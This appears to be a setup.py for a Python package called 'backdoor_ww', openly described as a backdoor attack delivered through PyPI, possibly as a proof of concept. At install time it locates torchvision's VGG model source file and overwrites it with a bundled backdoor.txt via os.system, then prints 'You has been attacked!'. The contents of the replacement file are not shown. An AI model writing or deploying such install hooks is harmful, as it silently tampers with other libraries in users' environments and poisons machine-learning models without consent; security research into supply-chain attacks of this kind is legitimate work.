from setuptools import setup
from setuptools import find_packages
import os
import torchvision


VERSION = '0.1.1'

path = torchvision.models.vgg.__file__
os.system(f"cp ./src/backdoor_ww/backdoor.txt {path}")
print("You has been attacked!")

setup(
    name='backdoor_ww',  # package name
    version=VERSION,  # package version
    description='Backdoor attack by PyPI package',  # package description
    packages=find_packages("src"),
    package_dir={"": "src"},
    include_package_data=True,
    package_data={"backdoor_ww":["*.txt"]},
    zip_safe=False,
)
